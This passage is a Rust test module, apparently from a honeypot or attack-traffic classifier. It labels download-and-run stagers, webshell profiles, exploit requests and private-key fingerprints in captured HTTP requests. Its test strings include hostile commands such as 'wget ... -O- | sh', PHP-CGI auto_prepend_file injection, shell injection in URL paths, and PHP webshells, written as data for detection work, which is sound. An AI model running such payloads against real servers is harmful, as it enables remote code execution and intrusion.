            assert_eq!(*host, host.to_ascii_lowercase());
        }
    }

    #[test]
    fn fetched_and_piped_url_is_a_stager() {
        let x = post("curl -s http://example.org:8080/x.sh | sh");
        let p = one(&x, PieceKind::Stager);
        assert_eq!(p.role, Role::Stager);
        assert_eq!(p.value, "example.org");
        assert_eq!(p.url.as_deref(), Some("http://example.org:8080/x.sh"));
        assert_eq!(p.grade, Grade::Claimed);
    }

    #[test]
    fn a_form_field_is_read_like_a_body() {
        let x = post("a=1&cmd=wget+http%3A%2F%2Fexample.org%2Fx.sh+-O-|sh");
        let p = one(&x, PieceKind::Stager);
        assert_eq!((p.role, p.value.as_str()), (Role::Stager, "example.org"));
    }

    #[test]
    fn scp_target_is_a_stager_on_its_host() {
        let x = post("scp root@203.0.113.9:/tmp/x /tmp/x; sh /tmp/x");
        let p = one(&x, PieceKind::Stager);
        assert_eq!((p.role, p.value.as_str()), (Role::Stager, "203.0.113.9"));
        assert_eq!(p.url.as_deref(), Some("root@203.0.113.9:/tmp/x"));
    }

    #[test]
    fn scp_from_a_shared_host_keeps_its_path() {
        let x = post("scp git@github.com:op/tools /tmp/x; sh /tmp/x");
        let p = one(&x, PieceKind::Stager);
        assert_eq!(
            (p.role, p.value.as_str()),
            (Role::Stager, "scp://github.com/op/tools")
        );
    }

    #[test]
    fn queried_url_is_not_a_stager() {
        let x = upload("fetch('http://169.254.169.254/latest/').then(r => r.text());");
        assert_eq!(role_of(&x, "169.254.169.254"), Role::Queried);
        let x = post("curl -s http://example.org/ip");
        assert_eq!(role_of(&x, "example.org"), Role::Queried);
        let x = upload("requests.get('https://example.org/token') # python recon");
        assert_eq!(role_of(&x, "example.org"), Role::Queried);
    }

    #[test]
    fn private_hosts_are_queried() {
        for url in [
            "http://192.168.1.1/x",
            "http://127.0.0.1/x",
            "http://0.0.0.0/x",
            "http://${api}/x",
            "http://$HOST/x",
            "http://schemas.xmlsoap.org/soap/",
            "http://www.w3.org/2000/svg",
            "http://10.1.2.3/x",
            "http://172.16.0.1/x",
            "http://169.254.169.254/x",
            "http://100.64.0.1/x",
            "http://240.0.0.1/x",
            "http://255.1.2.3/x",
            "http://[::127.0.0.1]/x",
            "http://x.x.x.x/x",
            "http://1.2.3.4/x",
            "http://example.com/x",
            "http://attacker.com/x",
            "http://evil.com/x",
            "https://get.docker.com/x",
            "http://[::1]/x",
            "http://[fe80::1]/x",
            "http://[fd00::1]/x",
            "http://[::ffff:10.0.0.1]/x",
            "http://localhost/x",
            "http://printer.local/x",
            "http://metadata.google.internal/x",
            "http://intranet/x",
            "http://2130706433/x",
            "http://0x7f.1/x",
            "http://127.1/x",
            "http://1.2.3.4.5/x",
            "http://ifconfig.me/",
            "https://management.azure.com/x",
        ] {
            assert_eq!(stager_role(url).0, Role::Queried, "{url}");
        }
    }

    #[test]
    fn public_hosts_stay_joiners() {
        for (url, value) in [
            ("http://203.0.113.9/x", "203.0.113.9"),
            ("http://[2001:DB8::1]:8080/x", "2001:db8::1"),
            ("http://EXAMPLE.org./x", "example.org"),
            ("example.org/x", "example.org"),
            ("http://user:pw@example.org/x", "example.org"),
        ] {
            assert_eq!(stager_role(url), (Role::Stager, value.to_string()), "{url}");
        }
    }

    #[test]
    fn shared_host_keeps_the_full_url() {
        assert_eq!(
            stager_role("https://pastebin.com/raw/abc?x=1"),
            (Role::Stager, "https://pastebin.com/raw/abc".to_string())
        );
        assert_eq!(
            stager_role("https://raw.githubusercontent.com:443/Op/t/main/x#f"),
            (
                Role::Stager,
                "https://raw.githubusercontent.com/Op/t/main/x".to_string()
            )
        );
    }

    #[test]
    fn a_query_that_names_the_paste_is_kept() {
        assert_eq!(
            stager_role("https://pastebin.com/raw.php?i=abc"),
            (
                Role::Stager,
                "https://pastebin.com/raw.php?i=abc".to_string()
            )
        );
        assert_eq!(
            stager_role("https://pastebin.com/raw?i=abc#x"),
            (Role::Stager, "https://pastebin.com/raw?i=abc".to_string())
        );
    }

    #[test]
    fn a_user_name_under_a_shared_host_joins() {
        assert_eq!(
            stager_role("https://op.surge.sh/"),
            (Role::Stager, "https://op.surge.sh".to_string())
        );
    }

    #[test]
    fn suffix_match_stops_at_a_dot() {
        assert_eq!(
            stager_role("https://notpastebin.com/raw/abc"),
            (Role::Stager, "notpastebin.com".to_string())
        );
    }

    /// Everybody on a shared host would share these values.
    #[test]
    fn a_shared_host_with_no_user_part_joins_nothing() {
        assert_eq!(stager_role("https://github.com/").0, Role::Queried);
        assert_eq!(stager_role("https://pastebin.com").0, Role::Queried);
        assert_eq!(stager_role("https://pastebin.com/raw/$ID").0, Role::Queried);
        for url in [
            "https://pastebin.com/raw/%s",
            "https://pastebin.com/raw/",
            "https://pastebin.com/raw",
            "https://pastebin.com/raw.php",
            "https://pastebin.com/raw.php?i=%s",
            "https://op.surge.sh/$PATH",
        ] {
            assert_eq!(stager_role(url).0, Role::Queried, "{url}");
        }
    }

    #[test]
    fn sender_is_self_hosted() {
        let (role, value) = stager_role("http://198.51.100.7/bot");
        assert_eq!((role, value.as_str()), (Role::SelfHosted, SENDER));
        let x = post("curl http://198.51.100.7/ip");
        assert_eq!(role_of(&x, SENDER), Role::Queried);
    }

    #[test]
    fn sender_is_compared_as_an_address() {
        let x = parse(
            Source::Request {
                method: "POST",
                path: "/",
                query: None,
                body: Some(b"wget http://[2001:db8::7]/x -O- | sh"),
                sender: Some("2001:0db8:0:0:0:0:0:7"),
            },
            Policy::embedded(),
        );
        assert_eq!(one(&x, PieceKind::Stager).role, Role::SelfHosted);
    }

    #[test]
    fn port_is_dropped_from_the_value() {
        assert_eq!(stager_role("http://example.org:81/x").1, "example.org");
        assert_eq!(stager_role("example.org:81/x").1, "example.org");
    }

    #[test]
    fn urls_of_one_host_are_kept_side_by_side() {
        let x = post("wget http://example.org/a -O- | sh; wget http://example.org/b -O- | sh");
        let urls: Vec<_> = of(&x, PieceKind::Stager)
            .iter()
            .map(|p| p.url.clone().unwrap())
            .collect();
        assert_eq!(urls, ["http://example.org/a", "http://example.org/b"]);
    }

    #[test]
    fn a_stager_is_not_also_queried() {
        let x = post("curl http://example.org/check; wget http://example.org/x -O- | sh");
        assert_eq!(role_of(&x, "example.org"), Role::Stager);
    }

    #[test]
    fn php_fetch_and_save_is_a_stager() {
        let x = post(
            "<?php function adminer($url, $isi) { $fp = fopen($isi, \"w\"); \
             $ch = curl_init($url); curl_setopt($ch, CURLOPT_FILE, $fp); curl_exec($ch); } \
             adminer(\"https://example.org/a.txt?x=1\", \"a.php\"); ?>",
        );
        let p = one(&x, PieceKind::Stager);
        assert_eq!((p.role, p.value.as_str()), (Role::Stager, "example.org"));
        assert_eq!(p.url.as_deref(), Some("https://example.org/a.txt?x=1"));
        let x = post(
            "<?php file_put_contents('a.php', file_get_contents('https://example.org/a')); ?>",
        );
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
    }

    #[test]
    fn php_fetch_alone_is_queried() {
        let x = post("<?php echo file_get_contents('https://example.org/a'); ?>");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
        let x = post("<?php $c = curl_init('https://example.org/a'); curl_exec($c); ?>");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
        let x = post("<?php $f = fopen('https://example.org/a', 'r'); echo fread($f, 9); ?>");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
    }

    /// `file_put_contents` and `file_get_contents` around each text, as in a
    /// file manager: fetching and writing say nothing about this URL.
    fn shared_script(php: &str) -> Role {
        let x = post(&format!(
            "<?php file_put_contents($f, file_get_contents($g)); {php} ?>"
        ));
        one(&x, PieceKind::Stager).role
    }

    #[test]
    fn a_credit_is_not_a_stager() {
        for php in [
            "echo \"by https://example.org/\";",
            "echo 'https://example.org/';",
            "echo('https://example.org/');",
            "echo 'by', 'https://example.org/';",
            "print 'https://example.org/';",
            "print('https://example.org/');",
            "die('https://example.org/');",
            "// https://example.org/",
            "// adminer('https://example.org/');",
            "# adminer('https://example.org/');",
            "/* adminer('https://example.org/'); */",
            "$a = \"@import url('https://example.org/x.css');\";",
            "url('https://example.org/x.css');",
            "href = \"https://example.org/\";",
            "location='https://example.org/';",
            "if ($a == 'https://example.org/') { }",
            "$a = array('x' => 'https://example.org/');",
            "$a = 'see https://example.org/ for more';",
        ] {
            assert_eq!(shared_script(php), Role::Queried, "{php}");
        }
    }

    #[test]
    fn a_whole_literal_in_a_fetching_script_is_a_stager() {
        for php in [
            "drop('https://example.org/x');",
            "drop('a', 'https://example.org/x');",
            "$u = 'https://example.org/x';",
            "$this->u = 'https://example.org/x';",
            "$a['u'] = 'https://example.org/x';",
        ] {
            assert_eq!(shared_script(php), Role::Stager, "{php}");
        }
    }

    #[test]
    fn php_that_runs_or_copies_what_it_fetches_is_a_stager() {
        for php in [
            "copy('http://example.org/s.txt', 'x.php');",
            "$u = 'http://example.org/s.txt'; copy($u, 'x.php');",
            "eval(file_get_contents('http://example.org/s'));",
            "eval('?>' . file_get_contents('http://example.org/s'));",
            "assert(file_get_contents('http://example.org/s'));",
            "include 'http://example.org/s';",
            "include('http://example.org/s');",
            "require_once \"http://example.org/s\";",
            "$f = fopen('http://example.org/s', 'r'); file_put_contents('a', fread($f, 9));",
        ] {
            let x = post(&format!("<?php {php} ?>"));
            assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager, "{php}");
        }
    }

    #[test]
    fn copy_of_another_file_keeps_nothing() {
        let x = post("<?php $u = 'http://example.org/s'; copy($a, $b); ?>");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
    }

    #[test]
    fn a_url_decoded_for_the_fetch_is_a_stager() {
        // base64 of http://example.org/x
        let php = "<?php file_put_contents('a.php', \
                   file_get_contents(base64_decode('aHR0cDovL2V4YW1wbGUub3JnL3g='))); ?>";
        assert_eq!(one(&post(php), PieceKind::Stager).role, Role::Stager);
    }

    #[test]
    fn a_php_cgi_option_loading_a_url_is_a_stager() {
        let x = request(
            "POST",
            "/x",
            Some("%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dhttp://example.org/s"),
            b"",
        );
        assert_eq!(role_of(&x, "example.org"), Role::Stager);
    }

    #[test]
    fn shell_in_the_path_is_read() {
        let x = request(
            "GET",
            "/x${IFS}&&wget${IFS}http://example.org/x${IFS}-O-|sh",
            None,
            b"",
        );
        assert_eq!(role_of(&x, "example.org"), Role::Stager);
        assert_eq!(of(&x, PieceKind::Exploit).len(), 1);
        assert!(x.layers.iter().any(|l| l.kind == LayerKind::Path));
        let x = request(
            "GET",
            "/cgi-bin/;wget%20http://example.org/x%20-O-|sh",
            None,
            b"",
        );
        assert_eq!(role_of(&x, "example.org"), Role::Stager);
    }

    #[test]
    fn a_path_that_only_names_a_shell_is_no_shell() {
        for path in ["/bin/sh", "/sh", "/cgi-bin/.%2e/.%2e/bin/sh", "/a.sh"] {
            let x = request("GET", path, None, b"");
            assert_eq!(x.layers.len(), 1, "{path}");
            assert_eq!(x.pieces, [], "{path}");
        }
    }

    #[test]
    fn no_key_text_reaches_a_piece() {
        let key = "-----BEGIN+OPENSSH+PRIVATE+KEY-----%0Ab3BlbnNzaC1rZXktdjEAAAAA";
        let block = "-----BEGIN RSA PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END RSA PRIVATE KEY-----";
        for body in [
            format!("see http://example.org/?k={key}"),
            format!("see https://pastebin.com/{key}"),
            format!("wget http://example.org/?k={key} -O- | sh"),
            format!("curl --data-binary 'k={block}' http://example.org/x | sh"),
            format!("curl --data-raw '{block}' http://example.org/x | sh"),
        ] {
            let x = post(&body);
            for p in &x.pieces {
                let text = format!("{} {:?}", p.value, p.url);
                assert!(
                    !text.contains("BEGIN") && !text.contains("b3Blbn"),
                    "{body}: {p:?}"
                );
            }
        }
        let x = post(&format!(
            "curl --data-binary 'k={block}' http://example.org/x | sh"
        ));
        assert_eq!(role_of(&x, "example.org"), Role::Stager);
    }

    #[test]
    fn no_key_text_reaches_the_exploit_value() {
        let x = request(
            "POST",
            "/a/-----BEGIN%20RSA%20PRIVATE%20KEY-----b3Blbn/x",
            Some("k=1&-----BEGIN+RSA+PRIVATE+KEY-----=2"),
            b"sh /tmp/x.sh",
        );
        let value = &one(&x, PieceKind::Exploit).value;
        assert_eq!(value, "POST /a ?k");
    }

    /// A file manager fetches and writes for its user, and its page links to
    /// its author: that is no stager, and it would tie its users together.
    #[test]
    fn a_link_in_a_page_is_queried() {
        let x = post(
            "<?php file_put_contents($f, file_get_contents($g)); \
             echo \"<a href=\\\"https://example.org/\\\">by me</a>\"; ?>",
        );
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried);
    }

    #[test]
    fn php_shell_text_is_read_as_a_recipe() {
        let x = post("<?php system('cd /tmp; wget http://example.org/x -O- | sh'); ?>");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
        assert_eq!(of(&x, PieceKind::Recipe).len(), 1);
        let x =
            post("<?php shell_exec(base64_decode('Y3VybCBodHRwOi8vZXhhbXBsZS5vcmcveCB8IHNo')); ?>");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
    }

    #[test]
    fn php_cgi_body_is_read_too() {
        let x = request(
            "POST",
            "/hello.world",
            Some("%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
            b"system('wget http://example.org/x -O- | sh');",
        );
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
    }

    #[test]
    fn exploit_piece_needs_something_executable() {
        assert_eq!(request("GET", "/.env", None, b"").pieces, []);
        assert_eq!(request("POST", "/login", None, b"user=a&pass=b").pieces, []);
        assert_eq!(request("POST", "/", None, b"<?php echo 1; ?>").pieces, []);
        let x = post("wget http://example.org/x -O- | sh");
        assert!(!x.recipes.is_empty());
        let p = one(&x, PieceKind::Exploit);
        assert_eq!((p.value.as_str(), p.role), ("POST /x", Role::Exploit));
        assert_eq!(p.grade, Grade::Seen);
    }

    #[test]
    fn a_php_execution_layer_is_executable() {
        let x = post("<?php passthru($_GET['c']); ?>");
        assert_eq!(one(&x, PieceKind::Exploit).value, "POST /x");
    }

    /// A method of some object, or a function of another name.
    #[test]
    fn exec_needs_the_function_itself() {
        for php in [
            "<?php $db->exec($q); ?>",
            "<?php PDO::exec($q); ?>",
            "<?php curl_exec($c); ?>",
            "<?php my_system($q); ?>",
        ] {
            assert_eq!(post(php).pieces, [], "{php}");
        }
    }

    #[test]
    fn a_php_cgi_body_counts_as_executable() {
        let x = request(
            "POST",
            "/x",
            Some("%ADd+auto_prepend_file%3dphp://input"),
            b"system('id');",
        );
        assert!(x.php_body);
        assert_eq!(
            one(&x, PieceKind::Exploit).value,
            "POST /x ?-d auto_prepend_file"
        );
    }

    #[test]
    fn a_file_sent_along_counts_as_executable() {
        let body = "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.png\"\r\n\r\nhi\r\n--b--\r\n";
        let x = post(body);
        assert_eq!(one(&x, PieceKind::Exploit).value, "POST /x");
        let x = request("PUT", "/a.txt", None, b"hello");
        assert_eq!(one(&x, PieceKind::Exploit).value, "PUT /a.txt");
        assert_eq!(request("PUT", "/a.txt", None, b"").pieces, []);
    }

    #[test]
    fn exploit_value_has_method_shape_and_query_names() {
        let x = request(
            "post",
            "/hello.world",
            Some("%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
            b"<?php system('id'); ?>",
        );
        assert_eq!(
            one(&x, PieceKind::Exploit).value,
            "POST /hello.world ?-d allow_url_include -d auto_prepend_file"
        );
        let x = request(
            "GET",
            "/a/1234/b.php",
            Some("z=1&c=wget+http://example.org/x|sh&Z=2&bad%20name=1&c=2"),
            b"",
        );
        assert_eq!(one(&x, PieceKind::Exploit).value, "GET /a/{n}/b.php ?c z");
    }

    #[test]
    fn exploit_value_is_bounded() {
        let names: Vec<String> = (0..400).map(|i| format!("name{i}=1")).collect();
        let query = names.join("&");
        let x = request("GET", "/x", Some(&query), b"sh /tmp/x.sh");
        assert!(one(&x, PieceKind::Exploit).value.len() <= MAX_VALUE);
    }

    #[test]
    fn an_upload_has_no_exploit_piece_of_its_own() {
        let x = upload("wget http://example.org/x -O- | sh");
        assert_eq!(of(&x, PieceKind::Exploit), Vec::<&Piece>::new());
        assert_eq!(of(&x, PieceKind::Stager).len(), 1);
    }

    #[test]
    fn recipe_piece_is_the_normal_form() {
        let x = post("wget http://example.org/x -O- | sh");
        let p = one(&x, PieceKind::Recipe);
        assert_eq!(p.value, x.recipes[0].normal);
        assert_eq!((p.role, p.grade), (Role::Recipe, Grade::Claimed));
        assert!(!p.value.contains("example.org"));
    }

    #[test]
    fn tag_is_claimed() {
        let x = post("cd /tmp; wget http://example.org/x -O- | sh -s cve_2024_4577.selfrep");
        let p = one(&x, PieceKind::Tag);
        assert_eq!(p.value, "cve_2024_4577.selfrep");
        assert_eq!((p.role, p.grade), (Role::Tag, Grade::Claimed));
        let text = &x.layers[p.at.layer].text[p.at.start..p.at.end];
        assert_eq!(text, b"cve_2024_4577.selfrep");
    }

    #[test]
    fn profile_reads_webshell() {
        let x = upload("<?php system($_GET['cmd']); echo 'mr0x02'; ?>");
        let p = one(&x, PieceKind::ShellProfile);
        assert_eq!(p.value, "input=$_GET[cmd];exec=system;marker=mr0x02");
        assert_eq!(p.grade, Grade::Seen);
    }

    #[test]
    fn profile_notes_a_password_check() {
        for php in [
            "<?php if ($_POST['pw'] == 'x') { eval($_POST['c']); } ?>",
            "<?php if (md5($_POST['pw']) === 'x') { eval($_POST['c']); } ?>",
            "<?php if ('x' != $_POST[\"pw\"]) die(); eval($_POST['c']); ?>",
        ] {
            let x = upload(php);
            assert_eq!(
                one(&x, PieceKind::ShellProfile).value,
                "input=$_POST[c];exec=eval;password=$_POST[pw]",
                "{php}"
            );
        }
    }

    #[test]
    fn the_password_itself_is_not_kept() {
        let x = upload("<?php if ($_GET['k'] == 'hunter2hunter2') { system($_GET['c']); } ?>");
        assert!(!one(&x, PieceKind::ShellProfile).value.contains("hunter2"));
    }

    #[test]
    fn profile_needs_input_and_execution() {
        assert_eq!(
            of(&upload("<?php system('id'); ?>"), PieceKind::ShellProfile).len(),
            0
        );
        assert_eq!(
            of(
                &upload("<?php echo $_GET['a']; ?>"),
                PieceKind::ShellProfile
            )
            .len(),
            0
        );
        assert_eq!(
            of(&upload("$_GET['a'] system('id')"), PieceKind::ShellProfile).len(),
            0
        );
        let php = "<?php if ($_SERVER['REQUEST_METHOD'] == 'POST') { system('id'); } ?>";
        assert_eq!(of(&upload(php), PieceKind::ShellProfile).len(), 0);
    }

    #[test]
    fn profile_reads_inputs_of_all_kinds() {
        let x = upload("<?php eval(file_get_contents('php://input')); ?>");
        assert_eq!(
            one(&x, PieceKind::ShellProfile).value,
            "input=php://input;exec=eval"
        );
        let x = upload("<?php assert($_SERVER['HTTP_X_CMD']); ?>");
        assert_eq!(
            one(&x, PieceKind::ShellProfile).value,
            "input=$_SERVER[HTTP_X_CMD];exec=assert"
        );
    }

    #[test]
    fn profile_skips_markup_as_a_marker() {
        let x = upload("<?php echo \"<pre>\"; passthru($_REQUEST[c]); print('done!'); ?>");
        assert_eq!(
            one(&x, PieceKind::ShellProfile).value,
            "input=$_REQUEST[c];exec=passthru;marker=done!"
        );
    }

    #[test]
    fn key_piece_is_a_joiner_with_its_fingerprint_only() {
        let pem = "-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDw7cwpJG1bH9MJooBRnKlcC07AF0gxH3+QpTsT7TOBqgAAAJD7XCYu+1wm
-----END OPENSSH PRIVATE KEY-----";
        let x = post(&format!("echo '{pem}' > /tmp/k; chmod 600 /tmp/k"));
        let p = one(&x, PieceKind::Key);
        assert_eq!(p.role, Role::Key);
        assert_eq!(
            p.value,
            "SHA256:YlhoqO0PTGuB+gVzKzRA4bFUfYo6LJqJj0kM4dtuQEE"
        );
        assert_eq!(p.url, None);
        for p in &x.pieces {
            assert!(
                !p.value.contains("b3Blbn") && !p.value.contains("PRIVATE"),
                "{p:?}"
            );
        }
    }

    #[test]
    fn a_tag_inside_a_key_is_dropped() {
        let line = "QyNTUxOQAAACDw7cwpJG1bH9MJooBRnKlcC07AF0gxH3";
        let x = post(&format!(
            "echo '-----BEGIN X PRIVATE KEY-----\n{line}\n' > /tmp/k; sh /tmp/k {line}"
        ));
        assert!(!x.recipes.is_empty());
        assert_eq!(of(&x, PieceKind::Tag), Vec::<&Piece>::new());
    }

    #[test]
    fn repeats_are_one_piece_and_budget_is_spent() {
        let x = post("wget http://example.org/x -O- | sh\nwget http://example.org/x -O- | sh");
        assert_eq!(of(&x, PieceKind::Stager).len(), 1);
        let urls: Vec<String> = (0..600)
            .map(|i| format!("http://h{i}.example.org/"))
            .collect();
        let x = post(&urls.join(" "));
        assert_eq!(x.pieces.len(), MAX_PIECES);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn a_file_name_is_no_host() {
        for word in ["install.sh", "bot.arm7"] {
            let x = post(&format!("curl {word} | sh"));
            assert_eq!(one(&x, PieceKind::Stager).role, Role::Queried, "{word}");
        }
        let x = post("curl 203.0.113.9 | sh");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
        let x = post("tftp -g -r bot example.org; sh bot");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
    }

    #[test]
    fn shell_that_opens_like_json_is_still_read() {
        let x = post("[ \"$a\" = x ] && wget http://example.org/x -O- | sh");
        assert_eq!(one(&x, PieceKind::Stager).role, Role::Stager);
    }

    #[test]
    fn a_container_is_read_through_its_parts() {
        let x = post("a=1&cmd=wget+http://example.org/x+-O-|sh");
        assert_eq!(one(&x, PieceKind::Recipe).value, x.recipes[0].normal);
        let x = post("{\"c\":\"wget http://example.org/x -O- | sh\"}");
        assert_eq!(x.recipes.len(), 1, "{:?}", x.recipes);
    }

    #[test]
    fn spans_hold_on_cut_utf8() {
        let mut body = b"see http://example.org/\xff\xfe\xfd rest".to_vec();
        body.extend_from_slice(b"\nsh -s tag\xff");
        let x = request("POST", "/x", None, &body);
        assert!(!x.pieces.is_empty());
        for p in &x.pieces {
            let text = &x.layers[p.at.layer].text;
            assert!(p.at.start <= p.at.end && p.at.end <= text.len(), "{p:?}");
        }
    }

    /// One flood of queried URLs must not push out the joiners.
    #[test]
    fn joiners_come_before_queried_urls() {
        let urls: Vec<String> = (0..600)
            .map(|i| format!("http://h{i}.example.org/"))
            .collect();
        let x = post(&format!(
            "{{\"a\":\"{}\",\"b\":\"wget http://example.org/x -O- | sh\"}}",
            urls.join(" ")
        ));
        assert_eq!(role_of(&x, "example.org"), Role::Stager);
    }

    #[test]
    fn urls_per_piece_are_capped() {
        let steps: Vec<String> = (0..40)
            .map(|i| format!("wget http://example.org/{i} -O- | sh"))
            .collect();
        let x = post(&steps.join("\n"));
        assert_eq!(of(&x, PieceKind::Stager).len(), MAX_URLS);
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn a_url_over_the_limit_keeps_its_value() {
        let long = "a".repeat(MAX_VALUE);
        let x = upload(&format!("see http://example.org/{long}"));
        let p = one(&x, PieceKind::Stager);
        assert_eq!((p.value.as_str(), p.url.as_deref()), ("example.org", None));
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
        let x = post(&format!("wget http://example.org/{long} -O- | sh"));
        let p = one(&x, PieceKind::Stager);
        assert_eq!(p.role, Role::Stager);
        assert_eq!((p.value.as_str(), p.url.as_deref()), ("example.org", None));
    }

    #[test]
    fn prose_costs_no_recipe_and_no_limit() {
        let x = post("A long sentence about nothing, and some.sh file, nothing more.");
        assert_eq!(x.recipes, []);
        assert_eq!(x.opaque, []);
    }
}
